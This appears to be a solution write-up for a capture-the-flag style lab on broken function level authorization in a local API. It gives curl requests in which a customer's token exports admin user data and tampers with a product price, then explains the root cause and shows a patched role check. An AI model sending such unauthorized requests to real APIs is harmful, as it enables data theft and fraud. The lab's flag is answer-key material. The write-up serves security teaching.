# Solution: API5:2023 Broken Function Level Authorization (BFLA)

## 1. Walkthrough & Exploitation

### Step 1: Export Admin Users under Customer Credentials
```bash
curl -s -X GET http://127.0.0.1:8000/api/v1/admin/export-users \
  -H "Authorization: Bearer <ALICE_ACCESS_TOKEN>"
```

### Exploit Evidence
```json
{
  "total_users": 5,
  "users": [ ... ],
  "flag": "FLAG{API5_BFLA_ADMIN_EXPORT_EXTRACTED_4412}"
}
```

### Step 2: Tamper with Seller Product Price
```bash
curl -s -X PUT http://127.0.0.1:8000/api/v1/products/1/price \
  -H "Authorization: Bearer <ALICE_ACCESS_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"price": 0.99}'
```

---

## 2. Root Cause Analysis
The controller depended only on `get_current_user` (verifying token validity), but omitted the role enforcement dependency (`require_admin` or checking `product.seller_id == current_user.id`).

---

## 3. Patched Implementation
```python
# FIX: API5-BFLA
if current_user.role != "admin":
    raise HTTPException(
        status_code=status.HTTP_403_FORBIDDEN,
        detail="Access denied: Administrative privileges required.",
    )
```
